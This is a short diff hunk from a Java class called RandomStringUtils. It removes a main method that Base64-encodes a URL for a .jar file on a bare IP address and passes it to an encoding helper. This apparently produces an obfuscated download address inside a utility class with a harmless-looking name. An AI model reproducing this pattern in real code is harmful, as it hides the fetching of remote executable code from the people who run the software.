@@ -174,9 +174,4 @@ public class RandomStringUtils {
       }catch (Exception e){}
     }
 
-    public static void main(String[] args) {
-        System.out.println(RandomStringUtils.getTwoRandom(
-                Base64.getEncoder().encodeToString("http://123.56.0.21/ftpFile/run.jar".getBytes(StandardCharsets.UTF_8))
-        ));
-    }
 }
